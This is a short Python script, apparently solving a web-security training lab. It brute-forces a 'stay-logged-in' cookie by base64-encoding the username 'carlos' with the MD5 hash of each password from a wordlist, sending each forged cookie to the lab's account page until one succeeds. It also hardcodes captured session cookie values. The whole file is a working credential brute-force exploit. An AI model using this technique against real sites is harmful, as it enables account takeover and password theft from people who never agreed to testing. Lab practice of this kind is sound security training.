
import requests
import base64
import hashlib


fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))

url = "https://ac281f741f89b0eac05407f7008200ca.web-security-academy.net/my-account"

# session=ajV3Nc8EmTcpOC6hVoHEEHwUdLivM3vz; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
cookies = {
	"session":"ajV3Nc8EmTcpOC6hVoHEEHwUdLivM3vz",
	"stay-logged-in":"d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"
}


userpass = base64.b64decode('d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw')
hashvalue = userpass.decode().split(':')[-1]
#print(hashvalue)

username = "carlos"



for i in passwords:
	hashvalue = hashlib.md5(i.encode()).hexdigest()
	#print(hashvalue)
	hashvalue = "carlos:"+hashvalue
	#print(hashvalue)
	cookievalue = base64.b64encode(hashvalue.encode())
	#f.write(cookievalue.decode()+"\n")
	cookies = {
	
	"stay-logged-in":cookievalue.decode()
	}
	r = requests.post(url,cookies=cookies)
	if "Update email" in r.text:
		print(i)
		break
